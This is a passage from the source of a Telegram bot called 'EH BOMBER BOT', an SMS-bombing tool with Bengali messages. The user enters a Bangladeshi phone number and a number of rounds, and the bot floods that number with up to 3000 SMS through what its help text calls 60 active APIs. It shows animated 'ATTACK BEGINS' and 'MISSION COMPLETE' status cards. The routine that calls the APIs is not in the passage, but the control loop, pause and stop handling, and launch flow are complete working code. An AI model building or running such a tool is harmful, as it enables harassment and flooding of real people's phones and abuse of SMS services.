        return

    ev = active_attacks.get(uid)
    if ev is None:
        return

    if q.data == "toggle_off":
        ev.clear()
    elif q.data == "toggle_on":
        ev.set()

    # rebuild kb immediately so button label flips
    try:
        await q.edit_message_reply_markup(reply_markup=_toggle_kb(uid))
    except Exception:
        pass

async def got_amount(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    txt = update.message.text.strip()
    if not txt.isdigit() or not (1 <= int(txt) <= 50):
        await update.message.reply_text(
            "```\n❌  1 থেকে 50 এর মধ্যে দাও\n```",
            parse_mode="Markdown"
        )
        return ASK_AMOUNT

    amount    = int(txt)
    number    = ctx.user_data["number"]
    total_sms = amount * 60
    uid       = update.effective_user.id

    # ── init event & stop flag ──────────────────────────────────────────────
    ev = asyncio.Event()
    ev.set()
    active_attacks[uid] = ev
    stop_flags[uid]     = False

    # ── launch animation: spinning countdown before attack ──────────────────
    launch_msg = await update.message.reply_text(
        "```\n🚀  LAUNCHING...\n```",
        parse_mode="Markdown"
    )
    for i in ["3️⃣","2️⃣","1️⃣","💥 FIRE!"]:
        await asyncio.sleep(0.6)
        try:
            await launch_msg.edit_text(
                f"```\n{i}  ATTACK BEGINS\n```",
                parse_mode="Markdown"
            )
        except Exception:
            pass

    # ── main attack message ─────────────────────────────────────────────────
    status_msg = await update.message.reply_text(
        _attack_card(number, 0, amount, total_sms, 0),
        parse_mode="Markdown",
        reply_markup=_toggle_kb(uid)
    )

    loop = asyncio.get_event_loop()
    rnd  = 0
    tick = 0

    while rnd < amount:
        # stopped?
        if stop_flags.get(uid):
            break

        # paused? — show pause state, keep refreshing spinner
        if not ev.is_set():
            try:
                await status_msg.edit_text(
                    _attack_card(number, rnd, amount, total_sms, tick, paused=True),
                    parse_mode="Markdown",
                    reply_markup=_toggle_kb(uid)
                )
            except Exception:
                pass
            tick += 1
            await asyncio.sleep(1)
            continue

        rnd  += 1
        tick += 1
        await loop.run_in_executor(None, run_one_round, number)

        try:
            await status_msg.edit_text(
                _attack_card(number, rnd, amount, total_sms, tick),
                parse_mode="Markdown",
                reply_markup=_toggle_kb(uid)
            )
        except Exception:
            pass

        await asyncio.sleep(0.3)

    # ── cleanup ─────────────────────────────────────────────────────────────
    active_attacks.pop(uid, None)
    stopped = stop_flags.pop(uid, False)

    sent_total = rnd * 60
    bar_done   = _progress_bar(rnd, amount)
    pct_done   = int(rnd / amount * 100) if amount else 0

    if stopped:
        finish_text = (
            f"```\n"
            f"╔══════════════════════════╗\n"
            f"║   🛑  ATTACK STOPPED!    ║\n"
            f"╠══════════════════════════╣\n"
            f"║  📱  +88 {number}   ║\n"
            f"╠══════════════════════════╣\n"
            f"║  🔄  Rounds  : {rnd}/{amount}\n"
            f"║  📨  SMS     : {sent_total}\n"
            f"║  📊  Done    : {pct_done}%\n"
            f"╠══════════════════════════╣\n"
            f"║  {bar_done}\n"
            f"╚══════════════════════════╝\n"
            f"```"
        )
    else:
        finish_text = (
            f"```\n"
            f"╔══════════════════════════╗\n"
            f"║  💥  MISSION COMPLETE!   ║\n"
            f"╠══════════════════════════╣\n"
            f"║  📱  +88 {number}   ║\n"
            f"╠══════════════════════════╣\n"
            f"║  🔄  Rounds  : {amount}/{amount}\n"
            f"║  📨  SMS     : {sent_total}\n"
            f"║  📊  Done    : 100%\n"
            f"╠══════════════════════════╣\n"
            f"║  ████████████████  ✅\n"
            f"╚══════════════════════════╝\n"
            f"```"
        )

    try:
        await status_msg.edit_text(finish_text, parse_mode="Markdown")
    except Exception:
        pass

    await update.message.reply_text(
        "🔁 আবার চালাতে /bomb",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    stop_flags[uid] = True
    ev = active_attacks.get(uid)
    if ev: ev.set()
    await update.message.reply_text(
        "```\n❌  CANCELLED\n```",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def help_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "```\n"
        "╔══════════════════════╗\n"
        "║   📖  HELP  MENU     ║\n"
        "╠══════════════════════╣\n"
        "║ /start  → হোম স্ক্রিন ║\n"
        "║ /bomb   → আক্রমণ শুরু ║\n"
        "║ /cancel → বাতিল       ║\n"
        "╠══════════════════════╣\n"
        "║ 1 Round  = 60 SMS    ║\n"
        "║ Max 50R  = 3000 SMS  ║\n"
        "║ 60 APIs  active      ║\n"
        "╚══════════════════════╝\n"
        "```",
        parse_mode="Markdown"
    )

# ─── MAIN ──────────────────────────────────────────────────────────────────────

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("bomb", bomb_start),
            CallbackQueryHandler(bomb_start, pattern="^bomb$"),
        ],
        states={
            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_number)],
            ASK_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_amount)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help",  help_cmd))
    app.add_handler(conv)
    # toggle + stop — conv-এর বাইরে, যেকোনো সময় কাজ করে
    app.add_handler(CallbackQueryHandler(toggle_handler, pattern="^toggle_(on|off|stop)$"))
    # help popup from start menu
    app.add_handler(CallbackQueryHandler(help_cb, pattern="^help_cb$"))

    print("🚀 EH BOMBER BOT চালু হচ্ছে...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
